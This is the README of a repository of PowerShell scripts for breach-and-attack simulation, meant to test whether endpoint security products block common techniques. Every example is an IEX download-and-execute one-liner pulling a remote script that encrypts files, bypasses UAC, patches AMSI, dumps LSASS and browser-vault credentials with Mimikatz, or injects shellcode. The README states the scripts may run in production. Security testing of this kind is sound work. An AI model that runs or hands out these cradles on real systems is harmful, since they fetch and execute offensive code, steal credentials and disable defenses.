# Vendor Simulator Test Scripts

I decided to create the following repository of scripts that can be executed on production environment.
Many customers are using different BAS products with the intention to validate existing EDR vendors.
BAS products can be expensive and hard to comprehend. They also operate within the concept of IOC in mind and mostly do not trigger attack events.

The scripts are created with a mission to validate the prevention capabilities of existing endpoint security solutions.
In most cases, i tried to focus on stealthy and advanced behaviour.

The scripts can be executed on production envirenmnet. 

**Example:**

## Ransomware techniques:
Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources.
https://attack.mitre.org/techniques/T1486/

### Encryption  
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Encrypt -Path 'C:\Users\tester\Documents\Test';`

### Decryption  
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-RansomSIM.ps1"); Invoke-RansomSIM -Mode Decrypt -Path 'C:\Users\tester\Documents\Test';`

## User Account Control Bypass (UAC) 
Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation.
https://attack.mitre.org/techniques/T1548/002/

### 1. FodHelper
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-UAC1.ps1"); Invoke-FodHelper;`

### 2. ComputerDefaults
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-UAC2.ps1"); Invoke-ComputerDefaults;`

## Antimalware Scan Interface (AMSI) 
Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities.
Patching Antimalware Scan Interface (AMSI) becomes part of almost every attack with intention to tamper visibility into script execution
https://attack.mitre.org/techniques/T1562/001/

### 1. AmsiScanBuffer
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI1.ps1"); Invoke-AmsiBypass1;`

## Credentials Theft
Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system,depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.
https://attack.mitre.org/techniques/T1555/

### 1. Lsass logon passwords
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds;`

### 2. Browser Vault credential theft
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "vault::list";`

## Injection
Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.
https://attack.mitre.org/techniques/T1055/

### Shellcode Injection
Shellcode injection and execution is one of the most popular living-off-the-land techniques, the motivation of this technique is to execute a small malicious and evasive code that usually will remotely load next stage backdoor

#### 1. Entry Injection
Injection of shellcode into the entry of a legitimate spawn process
`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-ShellcodeInjection1.ps1"); Invoke-Shellcode1;`
